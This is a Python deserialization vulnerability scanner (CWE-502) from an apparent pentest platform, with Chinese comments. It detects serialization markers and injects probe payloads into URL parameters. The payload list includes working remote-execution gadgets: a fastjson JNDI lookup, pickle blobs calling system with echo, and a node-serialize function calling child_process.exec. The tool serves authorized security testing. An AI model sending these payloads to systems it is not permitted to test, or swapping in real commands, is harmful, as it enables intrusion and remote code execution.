# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/deserialization.py
"""
反序列化漏洞检测引擎（CWE-502）。

检测 Java / PHP / Python 三类反序列化特征：
- Java:  @type（Jackson/fastjson）、java.lang.Runtime、readObject()、Serializable 接口、rO0AB 序列化 BLOB
- PHP:   O:8:"stdClass":0:{} 序列化对象、__wakeup()、unserialize()
- Python: pickle.loads()、cPickle、__reduce__()、marshal.loads()、gASV 协议 4 BLOB

工作方式：
1. 被动检测：GET 目标，扫描响应文本 / 响应头 / Cookie / URL 参数中的反序列化标记；
2. 主动检测：对可注入参数发送典型序列化 Payload，观察错误回显（Java/PHP/Python
   反序列化异常信息）作为漏洞确认信号。
"""
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

from vulnclaw.core.logger import logger
from vulnclaw.config import settings
from vulnclaw.core.utils import async_get, build_attack_url
from vulnclaw.engines.base import BaseEngine


class DeserializationEngine(BaseEngine):
    name = "deserialization"
    description = "反序列化漏洞检测（CWE-502）：Java / PHP / Python 反序列化特征检测"
    enabled = True
    max_payloads = 8

    # v102: PAYLOADS from unified pool (core/data/payload_pool.yaml)
    def __init__(self):
        super().__init__()
        try:
            from vulnclaw.core.payload_pool import PayloadPool
            pooled = PayloadPool.load_dicts("deserialization")
            if pooled:
                self.PAYLOADS = [
                    (str(item.get("payload", "")), str(item.get("description") or item.get("_subcategory", "")), str(item.get("_subcategory", "")))
                    for item in pooled
                ]
        except Exception:
            pass

    # ---------------- 被动特征（响应文本/头/Cookie/URL） ----------------
    JAVA_INDICATORS: List[Tuple[str, str]] = [
        (r'@type\s*[":=]\s*"?[a-zA-Z_$][\w.$]*', 'Jackson/fastjson @type 反序列化'),
        (r'java\.lang\.Runtime', 'java.lang.Runtime 调用链'),
        (r'readObject\s*\(', 'readObject() 反序列化入口'),
        (r'implements\s+Serializable', 'Serializable 接口实现'),
        (r'\.Serializable\b', 'Serializable 引用'),
        (r'ysoserial', 'ysoserial 工具特征'),
        (r'rO0AB', 'Java 原生序列化 BLOB（base64）'),
        (r'\\xac\\xed\\x00\\x05', 'Java 原生序列化魔数'),
        (r'com\.(?:fasterxml|sun|thoughtworks|esotericsoftware)', 'Java 序列化框架组件'),
    ]
    PHP_INDICATORS: List[Tuple[str, str]] = [
        (r'O:\d+:"', 'PHP 序列化对象（O:长度:"类名"）'),
        (r'a:\d+:\{', 'PHP 序列化数组'),
        (r'__wakeup\s*\(', 'PHP __wakeup() 魔术方法'),
        (r'unserialize\s*\(', 'PHP unserialize() 反序列化调用'),
        (r'serialized.*phar', 'PHP phar 反序列化'),
    ]
    PY_INDICATORS: List[Tuple[str, str]] = [
        (r'pickle\.loads\s*\(', 'Python pickle.loads() 反序列化'),
        (r'cPickle', 'Python cPickle 反序列化'),
        (r'__reduce__\s*\(', 'Python __reduce__()（pickle 协议）'),
        (r'marshal\.loads\s*\(', 'Python marshal.loads() 反序列化'),
        (r'gASV', 'Python pickle 协议4 BLOB（base64）'),
    ]
    # A2 多栈补强：Ruby（Marshal/Psych/YAML）与 Node.js（node-serialize）
    RUBY_INDICATORS: List[Tuple[str, str]] = [
        (r'Marshal\.load', 'Ruby Marshal.load 反序列化'),
        (r'Marshal\.dump', 'Ruby Marshal.dump 序列化'),
        (r'Psych\.load', 'Ruby Psych(YAML) 反序列化'),
        (r'ActiveSupport::MessageVerifier', 'Rails MessageVerifier 反序列化'),
        (r'ActiveSupport::MessageEncryptor', 'Rails MessageEncryptor 反序列化'),
        (r'Oj\.load', 'Ruby Oj JSON 反序列化'),
        (r'JSON\.load', 'Ruby JSON.load 反序列化'),
        (r'Rails\.version', 'Ruby on Rails 框架'),
    ]
    NODE_INDICATORS: List[Tuple[str, str]] = [
        (r'node-serialize', 'Node.js node-serialize 反序列化'),
        (r'_\$\$ND_FUNC\$\$_', 'Node.js _$$ND_FUNC$$_ 函数注入'),
        (r'unserialize\s*\(', 'Node.js unserialize() 调用'),
        (r'require\([\'"]child_process', 'Node.js child_process 调用'),
        (r'vm\.runInContext', 'Node.js vm 沙箱执行'),
        (r'new Function\s*\(', 'Node.js Function 构造注入'),
        (r'express', 'Node.js Express 框架'),
    ]

    # ---------------- 主动 Payload ----------------
    PAYLOADS: List[Tuple[str, str, str]] = [
        ('{"@type":"java.lang.Runtime","x":"x"}', 'Java Jackson @type 反序列化', 'java'),
        ('{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/x","autoCommit":true}',
         'Java fastjson JdbcRowSetImpl JNDI 探测', 'java'),
        ('rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAABeHQAAXl4',
         'Java 原生序列化 BLOB（base64）回显探测', 'java'),
        ('O:8:"stdClass":0:{}', 'PHP 序列化对象（无属性）', 'php'),
        ('O:8:"stdClass":1:{s:4:"evil";s:4:"test";}', 'PHP 序列化对象（含属性）', 'php'),
        ('a:1:{i:0;s:4:"test";}', 'PHP 序列化数组', 'php'),
        ('gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA9lY2hvIHBvY190ZXN0lIWUUpQu',
         'Python pickle 协议4 BLOB（posix.system）', 'python'),
        ('cos\nsystem\n(S\'echo deserialization_poc\'\ntR.', 'Python pickle raw 命令执行', 'python'),
        ('gASVGAAAAAAAAACMBG1hcnOUjAVsb2Fkc5STlCmFlFKULg==',
         'Python marshal.loads 反序列化探针', 'python'),
        # A2 多栈补强：Ruby / Node.js
        ('\x04\x08o:\x0bVulnClawProbe', 'Ruby Marshal 未定义类探测', 'ruby'),
        ('--- !ruby/object:VulnClawProbe\nfoo: bar', 'Ruby Psych YAML 未定义类探测', 'ruby'),
        ('{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'echo deser_test\',function(){});}()"}',
         'Node node-serialize 函数注入', 'node'),
        ('{"type":"Buffer","data":[100,101,115,101,114,95,116,101,115,116]}', 'Node Buffer 反序列化探针', 'node'),
    ]

    # ---------------- 错误回显信号 ----------------
    JAVA_ERROR_SIGS = [
        r'com\.fasterxml\.jackson', r'fastjson', r'InvalidStreamException',
        r'ObjectStreamException', r'ClassNotFoundException', r'NoClassDefFoundError',
        r'UnrecognizedPropertyException', r'cannot be cast to',
        r'Could not read JSON', r'java\.io\.EOFException', r'deserializ',
        r'java\.io\.ObjectInputStream', r'Serializable', r'NotSerializableException',
    ]
    PHP_ERROR_SIGS = [
        r'unserialize\s*\(\)', r'__wakeup\(\)', r'PHP\s+Warning', r'PHP\s+Notice',
        r'class stdClass', r'Object of class', r'Fatal error.*unserialize',
    ]
    PY_ERROR_SIGS = [
        r'UnpicklingError', r'_pickle', r'pickle\.PicklingError', r'pickle\.UnpicklingError',
        r'unsupported pickle protocol', r'No module named', r'not implemented for this type',
        r'ValueError.*marshal', r'marshal.*error', r'bad marshal data',
    ]
    RUBY_ERROR_SIGS = [
        r'Marshal', r'ArgumentError', r'undefined class/module',
        r'TypeError.*Marshal', r'can\'t dump', r'expected Marshal',
        r'Psych::', r'bad Marshal', r'RubyGems',
    ]
    NODE_ERROR_SIGS = [
        r'_\$\$ND_FUNC\$\$_', r'node-serialize', r'Unexpected token', r'SyntaxError',
        r'unserialize', r'TypeError.*serialize', r'is not a function',
        r'child_process', r'ReferenceError',
    ]

    # ---------------- 实现 ----------------

    def _detect_stack(self, text: str, headers_str: str = "") -> List[str]:
        blob = (text or "") + "\n" + headers_str
        blob_lower = blob.lower()
        stacks = []
        if any(re.search(p, blob) for p, _ in self.JAVA_INDICATORS) or 'java' in blob_lower:
            stacks.append('java')
        if any(re.search(p, blob) for p, _ in self.PHP_INDICATORS) or 'php' in blob_lower or 'x-powered-by: php' in headers_str.lower():
            stacks.append('php')
        if any(re.search(p, blob) for p, _ in self.PY_INDICATORS) or 'python' in blob_lower or 'wsgi' in blob_lower:
            stacks.append('python')
        if any(re.search(p, blob) for p, _ in self.RUBY_INDICATORS) or any(k in blob_lower for k in ('ruby', 'rails', 'sinatra', 'rack', 'passenger')):
            stacks.append('ruby')
        if any(re.search(p, blob) for p, _ in self.NODE_INDICATORS) or any(k in blob_lower for k in ('node', 'express', 'nestjs', 'koa')):
            stacks.append('node')
        return stacks

    def _passive_check(self, blob: str, source: str) -> List[Dict]:
        hits = []
        if not blob:
            return hits
        for pattern, desc in self.JAVA_INDICATORS + self.PHP_INDICATORS + self.PY_INDICATORS + self.RUBY_INDICATORS + self.NODE_INDICATORS:
            if re.search(pattern, blob):
                hits.append({"desc": desc, "source": source})
        return hits

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings: List[Dict] = []
        timeout = getattr(settings, 'timeout', 30)
        logger.info(f"[Deserialization] 检测反序列化特征 (CWE-502): {target}")

        parsed = urlparse(target)

        # ---- 1. 被动检测：GET 目标主页 ----
        try:
            resp = await async_get(target, session=session, timeout=timeout)
            if isinstance(resp, tuple) and len(resp) >= 2:
                _status, text = resp[0], resp[1] or ""
                headers = resp[2] if len(resp) > 2 else {}
            else:
                _status, text = getattr(resp, 'status', 0), str(resp)
                headers = {}
            headers_str = "\n".join(f"{k}: {v}" for k, v in (headers or {}).items())
        except Exception as e:
            logger.debug(f"[Deserialization] 目标请求失败: {e}")
            return findings

        blob = f"{text}\n{headers_str}"
        hits = self._passive_check(blob, "响应/头")
        for key, values in parse_qs_lite(parsed.query).items():
            for v in values:
                hits += self._passive_check(v, f"URL 参数 {key}")

        seen = set()
        for hit in hits:
            dedup_key = hit["desc"]
            if dedup_key in seen:
                continue
            seen.add(dedup_key)
            findings.append({
                'url': target,
                'type': f'反序列化特征-{hit["desc"]}',
                'severity': 'Medium',
                'ai_verdict': '中',
                'evidence': f'在{hit["source"]}中发现反序列化特征: {hit["desc"]}',
                'method': 'deserialization',
            })
            logger.info(f"[Deserialization] 被动命中: {hit['desc']} ({hit['source']})")

        # ---- 2. 识别技术栈，用于主动 Payload 选择 ----
        stacks = self._detect_stack(blob)
        if not stacks:
            stacks = ['java', 'php', 'python', 'ruby', 'node']

        # ---- 3. 主动检测：对 URL 参数发送序列化 Payload ----
        params = parse_qs_lite(parsed.query)
        if params:
            from vulnclaw.core.scanner import safe_request
            payloads = self._select_payloads(stacks)
            for param, values in params.items():
                if not values:
                    continue
                for payload, desc, tech in payloads:
                    try:
                        test_url = build_attack_url(target, param, payload, parsed.query)
                        resp_a = await safe_request(test_url, session, method="GET", timeout=timeout)
                        if resp_a is None:
                            continue
                        resp_text = resp_a[1] if isinstance(resp_a, tuple) else str(resp_a)
                        if not isinstance(resp_text, str):
                            continue
                        if self._match_error_sig(resp_text, tech):
                            findings.append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'type': f'反序列化注入-{desc}',
                                'severity': 'High',
                                'ai_verdict': '高',
                                'evidence': f'参数 {param} 注入 {desc} 后出现 {tech} 反序列化错误回显',
                                'method': 'deserialization',
                            })
                            logger.info(f"[Deserialization] 主动命中: {param} -> {desc}")
                            break
                    except Exception as e:
                        logger.debug(f"[Deserialization] Payload 测试失败: {e}")

        logger.info(f"[Deserialization] 完成，发现 {len(findings)} 个反序列化特征")
        return findings

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        stacks = self._detect_stack(normal_resp[1] if normal_resp else "")
        if not stacks:
            stacks = ['java', 'php', 'python']
        timeout = getattr(settings, 'timeout', 30)

        from vulnclaw.core.scanner import safe_request
        for payload, desc, tech in self._select_payloads(stacks):
            try:
                test_url = build_attack_url(url, param, payload, parsed_query)
                resp = await safe_request(test_url, session, method="GET", timeout=timeout)
                if resp is None:
                    continue
                resp_text = resp[1] if isinstance(resp, tuple) else str(resp)
                if not isinstance(resp_text, str):
                    continue
                if self._match_error_sig(resp_text, tech):
                    return {
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'反序列化注入-{desc}',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'参数 {param} 注入 {desc} 后出现 {tech} 反序列化错误回显',
                        'method': 'deserialization',
                    }
            except Exception as e:
                logger.debug(f"[Deserialization] check 失败: {e}")
        return None

    # ---------------- 内部工具 ----------------

    def _select_payloads(self, stacks: List[str]) -> List[Tuple[str, str, str]]:
        selected = []
        seen = set()
        for stack in stacks:
            for p in self.PAYLOADS:
                if p[2] == stack and id(p) not in seen:
                    selected.append(p)
                    seen.add(id(p))
        for p in self.PAYLOADS:
            if id(p) not in seen:
                selected.append(p)
        return selected[: self.max_payloads]

    def _match_error_sig(self, resp_text: str, tech: str) -> bool:
        if tech == 'java':
            sigs = self.JAVA_ERROR_SIGS
        elif tech == 'php':
            sigs = self.PHP_ERROR_SIGS
        elif tech == 'python':
            sigs = self.PY_ERROR_SIGS
        elif tech == 'ruby':
            sigs = self.RUBY_ERROR_SIGS
        elif tech == 'node':
            sigs = self.NODE_ERROR_SIGS
        else:
            return False
        for sig in sigs:
            if re.search(sig, resp_text, flags=re.IGNORECASE):
                return True
        return False


def parse_qs_lite(qs: str) -> Dict[str, List[str]]:
    from urllib.parse import parse_qs
    if not qs:
        return {}
    return parse_qs(qs, keep_blank_values=True)


__all__ = ['DeserializationEngine']